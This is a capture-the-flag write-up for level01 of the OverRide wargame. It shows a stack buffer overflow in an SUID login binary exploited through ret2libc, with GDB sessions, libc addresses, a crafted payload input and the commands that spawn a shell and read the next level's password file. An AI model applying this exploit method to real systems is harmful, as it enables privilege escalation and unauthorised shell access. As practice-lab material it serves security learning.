# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)

# Exploit
The home of the level01 contians a binary, `level01`, that has an SUID bit set, and his owned by level02.

Using Dogbolt, we quicly identify a few misconceptions (see source.c for details):
1. A global variable we have control over.
2. Memory writing bigger than the size of the buffer they are writing in.

We identify using the source code that the expected username is "dat_wil" and the expected password is "admin", even though it still makes the program fails.
I start the program with GDB, and setup a breakpoint at the `verify_user_name()` call in the `main` function:
```
(gdb) b *0x0804852d
Breakpoint 1 at 0x804852d
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wilAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804852d in main ()
(gdb) i var
...
0x0804a040  a_user_name
...
```
Now, if we look at the content of `a_user_name`:
```
(gdb) x/20x 0x0804a040
0x804a040 <a_user_name>:        0x5f746164      0x416c6977      0x41414141      0x41414141
0x804a050 <a_user_name+16>:     0x41414141      0x41414141      0x41414141      0x41414141
0x804a060 <a_user_name+32>:     0x41414141      0x41414141      0x41414141      0x41414141
0x804a070 <a_user_name+48>:     0x41414141      0x0a414141      0x00000000      0x00000000
```
We see the repsentation of "dat_wil" followed by the 'A's we wrote. 
Then, we add another breakpoint at the `verify_user_pass()` call, continue the program and input 100 'B's in the password input:
```
(gdb) b verify_user_pass
Breakpoint 2 at 0x80484a8
(gdb) c
Continuing.
verifying username....

Enter Password: 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x080484a8 in verify_user_pass ()
(gdb) c
Continuing.
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x1      1
ecx            0xffffffff       -1
edx            0xf7fd08b8       -134412104
ebx            0x42424242       1111638594
esp            0xffffd7a0       0xffffd7a0
ebp            0x42424242       0x42424242
esi            0x0      0
edi            0x42424242       1111638594
eip            0x42424242       0x42424242
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```
As we can see, `eip` is now `0x42424242`, or "BBBBB", which means that we successfuly hijacked the process execution flow.

To exploit that stack buffer overflow, we are going to make use of a `ret2libc`.
The libc contains primarly two interesting functions for us:
- `system()`
- `excve()`

Using `system("/bin/sh")`, we can spawn a shell withut having to write any shellcode.
Get the address of `system` using GDB:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
However, returning on `system()` alone won't do much, we need to pass it a string with the command we want to execute.

To illustrate that, let's create a simple program that calls `system("/bin/sh");` and show its instructions with GDB:
```c
#include <stdlib.h>

int main() {
	system("/bin/sh");
	return 0;
}
```
Disassembling the `main()` functuon with GDB:
```
(gdb) disass main
Dump of assembler code for function main:
   0x00000000004004f4 <+0>:	push   rbp
   0x00000000004004f5 <+1>:	mov    rbp,rsp
   0x00000000004004f8 <+4>:	mov    edi,0x4005fc
   0x00000000004004fd <+9>:	call   0x4003f0 <system@plt>
   0x0000000000400502 <+14>:	mov    eax,0x0
   0x0000000000400507 <+19>:	pop    rbp
   0x0000000000400508 <+20>:	ret
End of assembler dump.
(gdb) x/s 0x4005fc
0x4005fc:	 "/bin/sh"
```
As we can see, before the call to `system()`, we put the string "/bin/sh" on top of the stack.
Moreover, a call to a function will put the return address on the stack too.

So, when we enter the `system()` function, the stack will be something like (after `call system`):
\+ ---------------------------- +
| Other instructions or data    |
\+ ---------------------------- +
| Return address of system      |
\+ ---------------------------- +
|  `0x4005fc`: str "/bin/sh"    |
\+ ---------------------------- +

Now, we need to find the address of a "/bin/sh" string inside of `libc` or input it in the stack ourselves. I will use the first method. 
To do so, we first need to know the `libc` being used by our program, and then find the string in it.

After running the program in GDB, you can do `info proc map` to get info on the loaded libs:
```
(gdb) info proc map
process 2383
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fdb000     0x3000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```
The library being used is `/lib32/libc-2.15.so` at starting address `0xf7e2c000`.
Let's examine the library to see where can we locate a "/bin/sh" string:
```bash
strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh
```
`strings` returns all human readable strings of a binary. `-a` reads all the file, `-t x` is to print the offset from the beginning of the file in hexadecimal format. 
So, we found a "/bin/sh" string at 0x15d7ec from the starting address of the `libc`, `0xf7e2c000`.
We can confirm that we found that string by printing what's at that address as a string using GDB:
```
(gdb) x/s 0xf7e2c000 + 0x15d7ec
0xf7f897ec:	 "/bin/sh"
```

Now, we have:
- the address of `system()`
- the address of a "/bin/sh" string
- a segfault

We can craft a payload!
We need to cause the segfault, then put the address of system to call it, the return address for system (can be anything), and then the argument for system: "/bin/sh".

Then craft a file containing the username and the payload as the password (one per line):
```
level01@OverRide:~$ echo dat_wil > input.txt && python payload.py >> input.txt
level01@OverRide:~$ cat input.txt
dat_wil
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAЮ��AAAA���
```
And finally `cat` it, (but keep the standard input opened) and execute the binary:
```
level01@OverRide:~$ cat input.txt - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cd ../level02
cat .pass
```
